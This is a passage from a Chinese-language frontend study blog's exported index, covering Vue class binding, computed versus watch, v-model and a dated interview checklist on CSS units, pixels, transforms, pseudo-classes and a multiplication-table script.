class="literal">true</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终渲染结果为：<code>&lt;div class=&quot;active&quot;&gt;\&lt;/div&gt;</code></p><p>v-bind就是<strong>用于绑定数据和元素属性的</strong> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">"url"</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">'.app'</span>,</span></span><br><span class="line"><span class="undefined">        data:&#123;</span></span><br><span class="line"><span class="javascript">            url:<span class="string">"https://www.baidu.com"</span>,</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然对象中也可以传入多个属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div :class=&quot;&#123;&apos;active&apos;:isActive,&apos;error&apos;:isError&#125;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--当值均为true时--&gt;</span><br><span class="line">&lt;div class=&quot;active error&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="（2）直接设置为对象"><a href="#（2）直接设置为对象" class="headerlink" title="（2）直接设置为对象"></a>（2）直接设置为对象</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"classObject"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">data: &#123;</span><br><span class="line">  classObject: &#123;</span><br><span class="line">    active: true,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）数组方法"><a href="#（3）数组方法" class="headerlink" title="（3）数组方法"></a>（3）数组方法</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"[activeClass, errorClass]"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> data:&#123;</span><br><span class="line">      activeClass: "active",</span><br><span class="line">      errorClass: "disActive"</span><br><span class="line"> &#125;,</span><br><span class="line"></span><br><span class="line">渲染为</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"active disActive"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="（4）三元运算符"><a href="#（4）三元运算符" class="headerlink" title="（4）三元运算符"></a>（4）三元运算符</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"[isActive?'active':'disActive']"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> data:&#123;</span><br><span class="line">      isActive: false,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">渲染为：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"disActive"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="（5）computed"><a href="#（5）computed" class="headerlink" title="（5）computed"></a>（5）computed</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">:class</span>=<span class="string">"classObject"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  data:&#123;</span><br><span class="line">    isActive: true,</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">      classObject: &#123;</span><br><span class="line">          active: this.isActive,</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="计算属性和-watch-的区别"><a href="#计算属性和-watch-的区别" class="headerlink" title="计算属性和 watch 的区别"></a>计算属性和 watch 的区别</h2><p><strong>一、 计算属性（computed）</strong> </p><blockquote><p>computed 是计算属性，它会根据你所依赖的数据动态显示新的计算结果</p></blockquote><p>通过计算出来的属性<strong>不需要调用</strong>直接可以在 DOM 里使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是原始值: &#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是计算属性的值: &#123;&#123; computedMessage&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           data: &#123;</span></span><br><span class="line"><span class="javascript">               message: <span class="string">'hello'</span></span></span><br><span class="line"><span class="undefined">           &#125;,</span></span><br><span class="line"><span class="undefined">           computed: &#123;</span></span><br><span class="line"><span class="javascript">               <span class="comment">// 计算属性的 getter</span></span></span><br><span class="line"><span class="javascript">               computedMessage: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">               <span class="comment">// `this` 指向 app 实例</span></span></span><br><span class="line"><span class="javascript">                   <span class="keyword">return</span> <span class="keyword">this</span>.message.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>)</span></span><br><span class="line"><span class="undefined">               &#125;</span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>二、methods同样可实现</strong> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Original message: "&#123;&#123; message &#125;&#125;"<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Computed reversed message: "&#123;&#123; reversedMessage() &#125;&#125;"<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">const app = new Vue(&#123;</span><br><span class="line">  el: '#app',</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: 'Hello'</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    // 计算属性的 getter</span><br><span class="line">    reversedMessage: function () &#123;</span><br><span class="line">      // this 指向 Vue 实例</span><br><span class="line">      return this.message.split('').reverse().join('')</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>三、监听属性（watch）</strong> </p><blockquote><p>侦听属性 <code>watch</code> 用来观察和响应数据的变动。 </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demodiv"</span>&gt;</span>      </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">    &#123;&#123;text&#125;&#125;         </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">"#demodiv"</span>,</span></span><br><span class="line"><span class="undefined">        data:&#123;</span></span><br><span class="line"><span class="javascript">                text:<span class="string">"abcdefg"</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        watch:&#123;</span></span><br><span class="line"><span class="undefined">            text(newval,oldval)&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(newval+<span class="string">'========'</span>+oldval)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（1）首先表明，computed 和 watch 都属于 watcher，在<code>initState</code>中初始化，一共有三种还有一种是渲染 Watcher 在 mount 中初始化，本质上都依赖于 Vue 的响应式原理。</p><p>（2）computed 本质是一个惰性求值的观察者，具有缓存性，只有当依赖变化后，第一次访问 computed 属性，才会计算新的值，其内部通过dirty属性标记计算属性是否需要重新求值。而 watch 则是当数据发生变化便会调用执行函数。</p><p>（3）<code>computed</code>: 当某个数据需要随着（依赖于）另一个数据的变动而作出改变时，这时候你需要使用计算属性。 <code>watch</code>: 当某个数据发生变化时，需要对这个数据的变化进行反应（进行一系列操作），这时候你需要使用侦听属性。<code>methods</code>: 与计算属性不同的是，每次读取数据时，都是计算一遍，除非你不需要缓存，否则这样做需要大量的性能开销。  </p><h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><p> v-model本质上是一个语法糖。（双向的）</p><p>如下代码<code>&lt;input v-model=&quot;test&quot;&gt;</code>本质上是&lt;<code>input :value=&quot;test&quot; @input=&quot;test = $event.target.value&quot;&gt;</code> </p><p><code>:value=&quot;test&quot;</code>设置input初始值为text值，</p><p><code>@input=&quot;test = $event.target.value</code>,当输入的值改变时，test更新</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.31</title>
      <link href="2020/03/31/%E6%97%A5%E5%B8%B8-2020.3.31/"/>
      <url>2020/03/31/%E6%97%A5%E5%B8%B8-2020.3.31/</url>
      
        <content type="html"><![CDATA[<h1 id="今日清单"><a href="#今日清单" class="headerlink" title="今日清单"></a>今日清单</h1><ul><li>px,em,rem的区别</li><li>设备（物理）像素和CSS（逻辑）像素</li><li>transform都有什么值</li><li>结构性伪类元素</li><li>css实现奇数行蓝，偶数行红</li><li>99乘法表</li><li>1px细线</li><li>css定位有哪几种，如果在一个文档流中给一个div定位fixed，不加left，top，它的位置在哪 </li><li>promise封装setInterval</li><li>清除浮动</li><li>数据结构，最大堆、最小堆，能写堆排序吗 </li><li>快排的思想，能不能写写 </li></ul><a id="more"></a><h2 id="1-px-em-rem的区别"><a href="#1-px-em-rem的区别" class="headerlink" title="1.px,em,rem的区别"></a>1.px,em,rem的区别</h2><h3 id="（1）px"><a href="#（1）px" class="headerlink" title="（1）px"></a>（1）px</h3><p>在Web页面初期制作中，我们都是使用“px”来设置我们的文本，因为他比较稳定和精确。但是这种方法存在一个问题，当用户在浏览器中浏览我们制作的Web页面时，他改变了浏览器的字体大小，这时会使用我们的Web页面布局被打破。 于是就有了em</p><h3 id="（2）em"><a href="#（2）em" class="headerlink" title="（2）em"></a>（2）em</h3><p>em是相对长度单位。它的单位长度是根据元素的文本垂直长度来决定的。可以作用在width、height、line-height、margin、padding、border等样式的设置上。 如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。 默认1em=16px。如果在body选择器中声明font-size=62.5%,则1em=10px。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.parent</span>&#123; </span></span><br><span class="line"><span class="css"><span class="selector-tag">font-size</span><span class="selector-pseudo">:5em</span>; <span class="comment">/*80px*/</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">height</span><span class="selector-pseudo">:10em</span>;<span class="comment">/*800px*/</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.child</span>&#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">font-size</span><span class="selector-pseudo">:2em</span>;<span class="comment">/*160px*/</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">height</span><span class="selector-pseudo">:2em</span>;<span class="comment">/*320px*/</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在不设置元素font-size的情况下，em总是根据父元素的font-size来确定长度；即使元素设置了font-size，多次嵌套使用em也往往会造成疏忽，不仅使用前需要大量计算，而且不能保证没有漏网之鱼。这将是一个繁杂而低效率的工作。 于是有了rem.</p><h3 id="（3）rem"><a href="#（3）rem" class="headerlink" title="（3）rem"></a>（3）rem</h3><p>rem不是依据父元素——而是依据根元素（root element）来确定其长度。</p><p>我们一般给根元素设置一个容易计算的font-size</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    html &#123;</span><br><span class="line">        font-size: 62.5%;   /* 10px */</span><br><span class="line">    &#125;</span><br><span class="line">    div &#123;</span><br><span class="line">        font-size: 2.4rem;  /* 24px */</span><br><span class="line">        width: 64rem;   /* 640px */</span><br><span class="line">        border: 0.1rem solid #ccc;  /* 1px */</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;div1&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;div2&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><h2 id="2-设备（物理）像素和CSS（逻辑）像素"><a href="#2-设备（物理）像素和CSS（逻辑）像素" class="headerlink" title="2. 设备（物理）像素和CSS（逻辑）像素"></a>2. 设备（物理）像素和CSS（逻辑）像素</h2><ul><li>设备像素又称为物理像素, 是”物理屏幕”上真实存在的发光点，只有屏幕一经出厂就固定不会改变</li><li>CSS像素又称为逻辑像素，是编程世界中虚拟的东西, 我们通过代码设置的像素都是逻辑像素</li><li>在PC端，1个CSS像素往往都是对应着电脑屏幕的1个物理像素,</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在手机端，最开始其实1个CSS个像素也是对应着手机屏幕的1个物理像素,</span><br><span class="line"></span><br><span class="line">但是后来一个改变世界的男人(乔布斯)改变了这一切~</span><br><span class="line"></span><br><span class="line">从iPhone4开始，苹果公司推出了所谓的retina视网膜屏幕。</span><br><span class="line"></span><br><span class="line">iPhone4的屏幕尺寸却没有变化，但是像素点却多了一倍</span><br><span class="line"></span><br><span class="line">这就导致了在1个CSS像素等于1个物理像素的手机上, 我们设置1个CSS像素只会占用1个物理像素</span><br><span class="line"></span><br><span class="line">而在1个CSS个像素不等于1个物理像素的手机上, 我们设置1个CSS像素就会占用2个物理像素</span><br><span class="line"></span><br><span class="line">所以仔细观察你会发现同样是1像素但是在retina视网膜屏幕的手机上会粗一些</span><br></pre></td></tr></table></figure><h2 id="3-transform有什么值"><a href="#3-transform有什么值" class="headerlink" title="3.transform有什么值"></a>3.transform有什么值</h2><p><code>transform: rotate | scale | skew | translate |matrix;</code></p><ul><li><p>transform:rotate(30deg)</p></li><li><p>scale(x,y)使元素水平方向和垂直方向同时缩放（也就是X轴和Y轴同时缩放）；</p><p>scaleX(x)元素仅水平方向缩放（X轴缩放）；</p><p>scaleY(y)元素仅垂直方向缩放（Y轴缩放）</p></li><li><p>skew(x,y)使元素在水平和垂直方向同时扭曲（X轴和Y轴同时按一定的角度值进行扭曲变形）；</p><p>skewX(x)仅使元素在水平方向扭曲变形（X轴扭曲变形）；</p><p>skewY(y)仅使元素在垂直方向扭曲变形（Y轴扭曲变形），</p></li><li><p>translate:同样有三种方法</p></li><li><p>matrix</p></li></ul><h2 id="4-结构性伪类元素"><a href="#4-结构性伪类元素" class="headerlink" title="4.结构性伪类元素"></a>4.结构性伪类元素</h2><p>结构性伪类选择器的公共特征是允许开发者根据文档结构来指定元素的样式。 </p><p><strong>（1）nth-child和nth-last-child</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p:nth-child(n)&#123;background:red&#125;  表示E父元素中的第n个字节点</span><br><span class="line">      p:nth-child(odd)&#123;background:red&#125;/*匹配奇数行*/</span><br><span class="line">      p:nth-child(even)&#123;background:red&#125;/*匹配偶数行*/</span><br><span class="line">      p:nth-child(2n)&#123;background:red&#125;/*其中n是从0开始计算*/</span><br></pre></td></tr></table></figure><p><strong>（2）E:first-child和E:last-child</strong> </p><p><strong>（3）nth-of-type(n) 和E:nth-last-of-type(n)</strong> </p><p><strong>（4）</strong>）E:root（根节点）、E:only-child（独子元素）、E:only-of-type（独子类型元素）和E:empty（孤节点） </p><h2 id="5-css实现奇数行蓝，偶数行红"><a href="#5-css实现奇数行蓝，偶数行红" class="headerlink" title="5.css实现奇数行蓝，偶数行红"></a>5.css实现奇数行蓝，偶数行红</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        div&#123;</span></span><br><span class="line"><span class="undefined">            width: 200px;</span></span><br><span class="line"><span class="undefined">            height: 200px;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">div</span><span class="selector-pseudo">:nth-child(odd)</span>&#123;</span></span><br><span class="line"><span class="undefined">            background-color: blue;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">div</span><span class="selector-pseudo">:nth-child(even)</span>&#123;</span></span><br><span class="line"><span class="undefined">            background-color: red;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-99乘法表"><a href="#6-99乘法表" class="headerlink" title="6. 99乘法表"></a>6. 99乘法表</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">       body&#123;</span></span><br><span class="line"><span class="undefined">           text-align: center;</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">       div&#123;</span></span><br><span class="line"><span class="undefined">           display: inline-block;</span></span><br><span class="line"><span class="undefined">           width: 100px;</span></span><br><span class="line"><span class="undefined">           height: 30px;</span></span><br><span class="line"><span class="css">           <span class="selector-tag">margin-left</span><span class="selector-pseudo">:-1px</span>;</span></span><br><span class="line"><span class="css">           <span class="selector-tag">margin-top</span><span class="selector-pseudo">:-1px</span>;</span></span><br><span class="line"><span class="css">           <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#000</span>;</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;<span class="number">10</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">           <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span></span><br><span class="line"><span class="javascript">               <span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>)</span></span><br><span class="line"><span class="javascript">               <span class="built_in">document</span>.body.appendChild(div)</span></span><br><span class="line"><span class="javascript">               div.innerHTML=(j+<span class="string">"*"</span>+i+<span class="string">"="</span>+j*i)</span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">document</span>.write(<span class="string">"&lt;br&gt;"</span>)</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="7-1px的细线如何实现"><a href="#7-1px的细线如何实现" class="headerlink" title="7. 1px的细线如何实现"></a>7. 1px的细线如何实现</h2><p>1 用小数px值</p><p>2 border-image</p><p>3 background渐变</p><p>4 transform scale(0.5)</p><h2 id="8-css定位有哪几种，如果在一个文档流中给一个div定位fixed，不加left，top，它的位置在哪"><a href="#8-css定位有哪几种，如果在一个文档流中给一个div定位fixed，不加left，top，它的位置在哪" class="headerlink" title="8.css定位有哪几种，如果在一个文档流中给一个div定位fixed，不加left，top，它的位置在哪"></a>8.css定位有哪几种，如果在一个文档流中给一个div定位fixed，不加left，top，它的位置在哪</h2><p>问题同position的属性，举个例子看看。</p><h2 id="9-promise能封装setInterval吗"><a href="#9-promise能封装setInterval吗" class="headerlink" title="9.promise能封装setInterval吗"></a>9.promise能封装setInterval吗</h2><p>不能，因为promise只能执行一次</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 